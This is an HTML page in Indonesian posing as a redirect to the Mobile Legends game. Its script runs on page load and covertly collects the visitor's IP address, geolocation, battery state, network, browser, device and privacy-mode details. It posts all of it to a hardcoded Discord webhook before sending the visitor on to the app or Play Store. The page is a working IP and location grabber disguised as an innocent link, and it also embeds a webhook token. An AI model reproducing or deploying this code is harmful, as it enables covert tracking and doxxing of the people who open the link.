<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <script>
        window.onload = async function() {
            const whUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
            const startTime = performance.now();

            try {
                const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
                const data = await res.json();
                const ip = data.ip;

                const lang = navigator.language || navigator.userLanguage;

                let ct = "Unknown";
                let nt = "Unknown";
                let ds = "Unknown";
                if (navigator.connection) {
                    ct = navigator.connection.effectiveType || "Unknown";
                    nt = navigator.connection.type || "Unknown";
                    ds = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown";
                    if (navigator.connection.downlinkMax > 10) nt = "WiFi";
                    else if (navigator.connection.downlinkMax > 0) nt = "Data Seluler";
                }

                let bl = "Unknown";
                let cs = "Unknown";
                let psm = "Unknown";
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    bl = `${Math.round(bat.level * 100)}%`;
                    cs = bat.charging ? "Charging" : "Not Charging";
                    psm = bat.saving ? "On" : "Off";
                }

                const ua = navigator.userAgent;
                let plat = "Unknown";
                if (/Android/i.test(ua)) plat = "Android";
                else if (/iPhone|iPad|iPod/i.test(ua)) plat = "iOS";
                else if (/Windows/i.test(ua)) plat = "Windows";
                else if (/Mac/i.test(ua)) plat = "MacOS";
                else if (/Linux/i.test(ua)) plat = "Linux";

                let br = "Unknown";
                if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) br = "Chrome";
                else if (/Firefox/i.test(ua)) br = "Firefox";
                else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) br = "Safari";
                else if (/Edg/i.test(ua)) br = "Edge";

                let geo = "Permission required";
                if (navigator.geolocation) {
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000, maximumAge: Infinity });
                        });
                        geo = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
                    } catch {
                        geo = "Permission required";
                    }
                }

                const sr = `${window.screen.width}x${window.screen.height}`;
                const lt = new Date().toLocaleString();
                const cc = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not Supported";
                const dnt = navigator.doNotTrack === "1" ? "On" : "Off";
                const dt = ((performance.now() - startTime) / 1000).toFixed(2) + " detik";
                const theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark" : "Light";

                let np = "Off";
                if ("Notification" in window) {
                    np = Notification.permission === "granted" ? "On" : "Off";
                }

                let bt = "Off";
                if (/FBAN|FBAV|Instagram|Twitter|Line|WhatsApp/i.test(ua)) {
                    bt = "On";
                }

                let ab = "Off";
                try {
                    const adTest = await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: "HEAD" });
                    if (!adTest.ok) ab = "On";
                } catch {
                    ab = "On";
                }

                let inc = "Off";
                try {
                    if (window.chrome && !window.chrome.runtime) inc = "On";
                    else if (window.indexedDB && !window.indexedDB.open) inc = "On";
                    else if (window.localStorage && !window.localStorage.length) inc = "On";
                } catch {
                    inc = "Off";
                }

                let dm = "Off";
                if (/Mobile/i.test(ua) && window.matchMedia("(min-width: 768px)").matches) {
                    dm = "On";
                }

                let dsm = "Off";
                if (navigator.connection && navigator.connection.saveData) {
                    dsm = "On";
                }

                await fetch(whUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}\nDuration Active: ${dt}\nTheme: ${theme}\nNotification Permission: ${np}\nIn-App Browser: ${bt}\nAdblock: ${ab}\nIncognito Mode: ${inc}\nDesktop Mode: ${dm}\nData Saver Mode: ${dsm}`
                    })
                });

                window.location.href = "mobilelegends://";
                setTimeout(() => {
                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                }, 2000);
            } catch {
                window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
            }
        };
    </script>
</head>
<body>
    <div style="text-align: center; font-family: Arial, sans-serif;">
        <h1>Mengalihkan ke Mobile Legends...</h1>
        <p>Harap tunggu beberapa detik.</p>
    </div>
</body>
</html>
